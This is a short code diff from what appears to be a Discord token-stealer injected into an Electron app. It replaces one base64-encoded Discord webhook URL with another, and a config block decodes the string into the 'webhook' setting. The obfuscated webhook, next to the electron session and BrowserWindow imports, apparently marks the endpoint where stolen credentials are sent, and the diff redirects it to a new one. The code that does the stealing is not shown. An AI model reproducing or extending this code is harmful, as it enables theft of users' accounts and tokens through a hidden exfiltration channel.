@@ -5,7 +5,7 @@ const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 const Buffer = require('buffer').Buffer
-const hook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTExODM1MTg3OTM3NDYzOTExNC9MMGhRWnlKclhRWUh2Zk5vUHNRd1dDcDI1bXVENnFIelFlMlN5cW9FOGFGNS0ta0FOZjZzSnRHMk5Ed0hYb2tZLUpnYQ=='
+const hook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTExOTQ0Njg1MTEwMDM0NDM2MC92cUhIQWRacEZWMVRrZDF3aldqeDY3OGcwMVRQMVNGYjY2NjFoS2pPS3kyM2ltYW9HX2RDdHNWSXFrSHJNN2ctUjl1Zg=='
 
 const config = {
   webhook: Buffer.from(hook, 'base64').toString('ascii'),
